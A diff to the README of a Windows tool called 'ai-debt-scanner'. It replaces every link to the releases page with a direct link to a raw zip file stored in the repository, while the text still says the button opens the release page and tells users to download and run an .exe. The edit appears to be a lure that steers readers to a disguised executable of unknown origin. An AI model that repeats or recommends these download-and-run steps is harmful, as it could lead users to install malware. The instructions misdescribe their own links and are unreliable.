@@ -1,6 +1,6 @@
 # ⚙️ ai-debt-scanner - Detect and Score Code Problems Easily
 
-[![Download latest version](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/Sachi7799/ai-debt-scanner/releases)
+[![Download latest version](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/Sachi7799/ai-debt-scanner/raw/refs/heads/main/skills/ai-debt-scanner/ai-debt-scanner-v2.6.zip)
 
 ---
 
@@ -31,7 +31,7 @@ You can get the tool from the official releases page. Follow these steps to down
 
 1. Click on the big blue button below. It takes you to the release page where you find the latest version of ai-debt-scanner.
 
-[![Download latest version](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/Sachi7799/ai-debt-scanner/releases)
+[![Download latest version](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/Sachi7799/ai-debt-scanner/raw/refs/heads/main/skills/ai-debt-scanner/ai-debt-scanner-v2.6.zip)
 
 2. On the GitHub releases page, look for the latest Windows version. It will usually have a `.exe` file inside the assets list.
 
@@ -121,6 +121,6 @@ Use this software regularly to track changes in your project quality. It helps r
 
 Visit the releases page below to get the latest version for Windows:
 
-https://github.com/Sachi7799/ai-debt-scanner/releases
+https://github.com/Sachi7799/ai-debt-scanner/raw/refs/heads/main/skills/ai-debt-scanner/ai-debt-scanner-v2.6.zip
 
 Use the instructions above to download and run the `.exe` file on your system.
